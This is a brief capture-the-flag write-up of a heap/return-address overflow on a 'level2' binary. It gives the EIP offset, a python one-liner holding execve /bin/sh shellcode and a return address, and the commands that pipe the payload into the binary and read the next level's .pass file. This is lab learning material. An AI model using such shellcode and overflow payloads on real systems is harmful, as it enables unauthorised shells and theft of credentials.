level2 binary with the rights of level3

main function calls p()

About p:
we notice that a malloc call is done (through the strdup call)
using ltrace we notice that we always have the same return address for the strdup call
we can try and do something in the heap

since we know the return address of the strdup we can put a shellcode inside it and run it by changing the eip register
shellcode to execve /bin/sh : http://shell-storm.org/shellcode/files/shellcode-575.php

we easily find out that eip offset is 80 characters

chmod 777 . && touch exploit && chmod 777 exploit
python -c 'print("\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "0"*59 + "\x08\xa0\x04\x08")' > exploit
cat exploit - | ./level3
cat /home/user/level3/.pass
yay it works !!!
